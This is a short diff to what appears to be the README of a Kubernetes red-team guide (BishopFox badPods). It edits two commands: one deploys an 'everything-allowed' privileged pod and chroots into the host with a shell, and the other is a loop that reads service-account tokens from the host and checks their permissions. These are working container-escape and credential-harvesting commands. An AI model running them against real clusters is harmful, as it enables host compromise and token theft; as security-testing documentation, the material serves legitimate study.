@@ -34,7 +34,7 @@ kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/[RESOURCE_TYPE]/everything-allowed-exec-[RESOURCE_TYPE].yaml 
 kubectl get pods | grep everything-allowed-exec-[RESOURCE_TYPE]      
-kubectl exec -it everything-allowed-exec-[RESOURCE_TYPE]-[ID] -- bash
+kubectl exec -it everything-allowed-exec-[RESOURCE_TYPE]-[ID] -- chroot /host bash
 ```
 
 *Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 
@@ -174,7 +174,7 @@ do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
 echo "Token Location: $filename_clean"; \
 tokena=`kubectl exec -it everything-allowed-exec-pod -- chroot /host "cat $filename_clean"`; \
 echo "What can I do?"; \
-kubectl -v9 --token=$tokena auth can-i --list; echo; \
+kubectl --token=$tokena auth can-i --list; echo; \
 done
 ```
 This is what just happened:
